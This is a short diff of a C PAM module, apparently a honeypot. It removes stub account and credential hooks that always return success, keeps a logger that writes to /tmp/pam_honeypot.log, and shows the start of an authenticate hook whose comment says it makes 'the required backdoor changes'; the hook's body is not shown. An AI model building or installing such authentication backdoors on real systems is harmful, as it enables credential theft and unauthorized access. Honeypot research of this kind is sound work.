@@ -9,21 +9,6 @@
 #include <unistd.h>
 #include <stdbool.h>
 #include <stdarg.h>
-
-/* expected hook */
-PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
-  return PAM_SUCCESS;
-}
-
-PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
-  printf("Acct mgmt\n");
-  return PAM_SUCCESS;
-}
-
-#define MAX_USERFILE_SIZE 1024
-#define USERSFILE "users"
-
-
 #define LOGFILE "/tmp/pam_honeypot.log"
 
 void mylog( const char* fmt, ... )
@@ -42,7 +27,6 @@ void mylog( const char* fmt, ... )
   va_end(ap);  
   
 }
-
 /* expected hook, this is where, we do all the required backdoor changes */
 PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
   //Declaring required variables
